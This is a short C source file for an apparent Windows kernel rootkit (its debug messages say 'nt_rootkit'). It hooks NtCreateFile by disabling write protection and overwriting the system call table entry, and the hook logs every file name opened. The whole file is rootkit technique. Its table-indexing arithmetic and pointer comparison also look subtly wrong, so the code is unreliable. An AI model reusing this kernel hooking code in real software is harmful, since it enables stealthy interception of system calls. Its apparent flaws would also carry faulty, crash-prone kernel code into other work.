#include "ssdt.h"
#include "wp.h"

int lsr(int x, int n) {
        return (int)((unsigned int)x >> n);
}

__declspec(dllimport) SST KeServiceDescriptorTable;

NtCreateFilePrototype old_ntcreatefile = NULL;

NTSTATUS hook_ntcreatefile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock,
        PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess,
        ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer,
        ULONG EaLength) {
        NTSTATUS status;

        DbgPrint("nt_rootkit: hook_ntcreatefile was called");
        DbgPrint("nt_rootkit: file name: %wZ", ObjectAttributes->ObjectName);

        status = old_ntcreatefile(FileHandle, DesiredAccess, ObjectAttributes,
                IoStatusBlock, AllocationSize, FileAttributes, ShareAccess,
                CreateDisposition, CreateOptions, EaBuffer, EaLength);
        if (!NT_SUCCESS(status))
                DbgPrint("nt_rootkit: NtCreateFile returned 0x%x.", status);

        return status;
}

// NtCreateFile User mode syscall = 0x55
// KiServiceTable offsets = 4 bytes
// NtCreateFile's service address is at KiServiceTable + (4 * 0x55)
// RoutineAbsoluteAddress = KiServiceTableAddress + (RoutineOffset >>> 4)
PULONG hook_ssdt(UINT32 user_syscall, PULONG function, PULONG hook_function) {
        PULONG result = 0;
        PULONG ssdt = (PLONG)KeServiceDescriptorTable.ServiceTable;
        PULONG target = (PLONG)&ssdt[(4 * user_syscall) >> 4];

        if (*target == *function)
        {
                disable_wp();
                result = (PULONG)InterlockedExchange(target,
                        *hook_function);
                enable_wp();
        }

        return result;
}